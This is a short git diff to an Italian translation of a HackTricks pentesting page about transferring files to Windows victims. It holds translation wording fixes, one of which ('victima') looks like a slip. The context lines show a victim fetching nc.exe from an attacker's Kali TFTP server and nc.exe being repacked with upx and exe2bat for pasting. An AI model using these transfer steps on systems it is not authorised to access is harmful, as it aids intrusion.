@@ -261,7 +261,7 @@ cp /path/tp/nc.exe /tftp
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-In **victim**, connettersi al server Kali:
+In **victima**, connettersi al server Kali:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
@@ -315,7 +315,7 @@ Il programma `debug.exe` non solo consente l'ispezione dei file binari, ma ha an
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Poi copia e incolla il testo nella windows-shell e verrà creato un file chiamato nc.exe.
+Poi copia e incolla il testo nella finestra di comando di Windows e verrà creato un file chiamato nc.exe.
 
 * [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
@@ -333,7 +333,7 @@ Impara e pratica il hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" dat
 
 * Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.
+* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository su github.
 
 </details>
 {% endhint %}
